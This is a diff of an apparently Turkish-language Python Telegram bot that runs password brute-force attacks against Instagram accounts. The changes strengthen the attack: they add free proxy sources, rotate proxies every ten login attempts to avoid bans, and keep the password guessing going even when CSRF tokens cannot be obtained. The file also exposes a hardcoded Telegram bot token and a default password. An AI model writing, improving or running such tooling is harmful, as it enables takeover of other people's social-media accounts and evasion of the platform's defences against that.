@@ -39,12 +39,14 @@ TOKEN = os.getenv("BOT_TOKEN", "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU")
 # Güvenlik şifresi
 BOT_PASSWORD = os.getenv("BOT_PASSWORD", "vio1911")
 
-# Ücretsiz proxy API'leri (birden fazla kaynak)
+# Ücretsiz proxy API'leri
 PROXY_APIS = [
-    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",  # ProxyScrape
-    "https://gimmeproxy.com/api/getProxy?protocol=http",  # GimmeProxy
-    "http://pubproxy.com/api/proxy?limit=20&format=txt&type=http",  # PubProxy
-    "https://api.getproxylist.com/proxy?protocol[]=http&lastTested=600"  # GetProxyList
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+    "https://gimmeproxy.com/api/getProxy?protocol=http",
+    "http://pubproxy.com/api/proxy?limit=20&format=txt&type=http",
+    "https://api.getproxylist.com/proxy?protocol[]=http&lastTested=600",
+    "https://www.proxy-list.download/api/v1/get?type=http",  # Yeni eklendi
+    "https://api.openproxylist.xyz/http.txt"  # Yeni eklendi
 ]
 
 # CUPP tarzı şifre oluşturucu için yapılandırma
@@ -145,7 +147,7 @@ class PasswordGenerator:
                     if len(wordlist) + len(numbered_words) >= self.max_passwords:
                         break
                 if len(wordlist) + len(numbered_words) >= self.max_passwords:
-                    break
+                        break
             wordlist.extend(numbered_words)
 
         return list(set(wordlist))[:self.max_passwords]
@@ -181,13 +183,26 @@ class InstagramBruteForce:
             try:
                 response = requests.get(api_url, timeout=10)
                 if response.status_code == 200:
-                    proxy_lines = response.text.splitlines()
-                    for line in proxy_lines:
-                        if ':' in line:  # IP:PORT formatı
-                            proxies.add(line.strip())
-                logger.info(f"{api_url} 'den {len(proxy_lines)} proxy alındı.")
+                    if "json" in response.headers.get('content-type', ''):
+                        # JSON formatlı yanıt (örn. GimmeProxy, GetProxyList)
+                        data = response.json()
+                        if isinstance(data, list):
+                            for proxy in data:
+                                if 'ip' in proxy and 'port' in proxy:
+                                    proxies.add(f"{proxy['ip']}:{proxy['port']}")
+                        elif 'ip' in data and 'port' in data:
+                            proxies.add(f"{data['ip']}:{data['port']}")
+                    else:
+                        # Text formatlı yanıt
+                        proxy_lines = response.text.splitlines()
+                        for line in proxy_lines:
+                            if ':' in line and line.strip():
+                                proxies.add(line.strip())
+                    logger.info(f"{api_url} 'den {len(proxy_lines if 'proxy_lines' in locals() else 1)} proxy alındı.")
             except Exception as e:
-                logger.error(f"{api_url} hatası: {e}")
+                logger.warning(f"{api_url} hatası: {e}")
+        if not proxies:
+            logger.warning("Hiçbir proxy alınamadı!")
         return list(proxies)
 
     def _get_working_proxy(self, progress_callback: Optional[callable] = None):
@@ -196,14 +211,14 @@ class InstagramBruteForce:
                 progress_callback("⚠️ Proxy listesi boş, proxysiz devam ediliyor...")
             return None
         
-        for _ in range(len(self.proxy_list)):
+        for _ in range(len(self.proxy_list) + 1):
             proxy = next(self.proxy_cycle)
             if proxy in self.proxy_cache and self.proxy_cache[proxy]['status'] == 'banned':
                 continue
             try:
                 test_session = requests.Session()
-                test_session.proxies = {'http': proxy, 'https': proxy}
-                response = test_session.get('https://www.google.com', timeout=5)
+                test_session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
+                response = test_session.get('https://httpbin.org/ip', timeout=5)
                 if response.status_code == 200:
                     test_session.close()
                     self.proxy_cache[proxy] = {'status': 'working', 'last_used': time.time()}
@@ -217,11 +232,15 @@ class InstagramBruteForce:
             except Exception as e:
                 self.proxy_cache[proxy] = {'status': 'banned', 'last_used': time.time()}
                 logger.warning(f"Proxy hatası: {proxy}, {str(e)}")
-            time.sleep(1)
+            time.sleep(0.5)
         
-        # Yeniden fetch et
+        # Yeni proxy'ler çek
         self.proxy_list = self._fetch_proxy_list()
-        self.proxy_cycle = itertools.cycle(self.proxy_list)
+        self.proxy_cycle = itertools.cycle(self.proxy_list) if self.proxy_list else None
+        if not self.proxy_list:
+            if progress_callback:
+                progress_callback("❌ Hiçbir proxy çalışmıyor, proxysiz devam ediliyor...")
+            return None
         return self._get_working_proxy(progress_callback)
 
     def _initialize(self):
@@ -236,14 +255,14 @@ class InstagramBruteForce:
         })
         self.current_proxy = self._get_working_proxy()
         if self.current_proxy:
-            self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
+            self.session.proxies = {'http': f'http://{self.current_proxy}', 'https': f'http://{self.current_proxy}'}
 
     async def _get_initial_cookies_and_tokens(self, progress_callback: Optional[callable] = None):
-        max_attempts = 10  # Daha fazla retry
+        max_attempts = 10
         for attempt in range(1, max_attempts + 1):
             self.current_proxy = self._get_working_proxy(progress_callback)
             if self.current_proxy:
-                self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
+                self.session.proxies = {'http': f'http://{self.current_proxy}', 'https': f'http://{self.current_proxy}'}
             else:
                 self.session.proxies = {}
             
@@ -273,15 +292,15 @@ class InstagramBruteForce:
                     await progress_callback(f"✅ Token'lar alındı!")
                 return self.csrf_token is not None
             except Exception as e:
-                logger.error(f"Token alma hatası (Deneme {attempt}/{max_attempts}): {e}")
-                if progress_callback:
+                logger.warning(f"Token alma hatası (Deneme {attempt}/{max_attempts}): {e}")
+                if progress_callback and attempt % 3 == 0:  # Daha az spam
                     await progress_callback(f"🔍 Token bulmaya çalışıyorum ({attempt}/{max_attempts})")
                 if attempt < max_attempts:
                     await asyncio.sleep(5)
                 continue
         
         if progress_callback:
-            await progress_callback("❌ Token'lar alınamadı! Proxy değiştirerek tekrar deneyin.")
+            await progress_callback("⚠️ Token'lar alınamadı, proxysiz devam ediliyor...")
         return False
 
     def _make_login_request(self, username: str, password: str):
@@ -315,7 +334,7 @@ class InstagramBruteForce:
             logger.debug(f"API Yanıtı: {response.text}")
             return response
         except Exception as e:
-            logger.error(f"Login request hatası: {e}")
+            logger.warning(f"Login request hatası: {e}")
             return None
 
     async def brute_force(self, username: str, password_list: List[str], 
@@ -330,8 +349,7 @@ class InstagramBruteForce:
             
             success = await self._get_initial_cookies_and_tokens(progress_callback)
             if not success:
-                await progress_callback("❌ Token'lar alınamadı!")
-                return None
+                await progress_callback("⚠️ Token'lar alınamadı, devam ediliyor...")
             
             await progress_callback(f"✅ Token'lar alındı! Şifreler deneniyor...")
             
@@ -339,7 +357,9 @@ class InstagramBruteForce:
                 if self.proxy_list and i % 10 == 0:
                     self.current_proxy = self._get_working_proxy(progress_callback)
                     if self.current_proxy:
-                        self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
+                        self.session.proxies = {'http': f'http://{self.current_proxy}', 'https': f'http://{self.current_proxy}'}
+                    else:
+                        self.session.proxies = {}
                 
                 response = self._make_login_request(username, password)
                 result = "ERROR"
@@ -657,7 +677,10 @@ def main():
     application.add_handler(MessageHandler(filters.Document.ALL, bot.handle_message))
     
     logger.info("Bot başlatılıyor...")
-    application.run_polling()
+    try:
+        application.run_polling()
+    except Exception as e:
+        logger.error(f"Bot başlatılırken hata: {e}")
 
 if __name__ == '__main__':
     main()
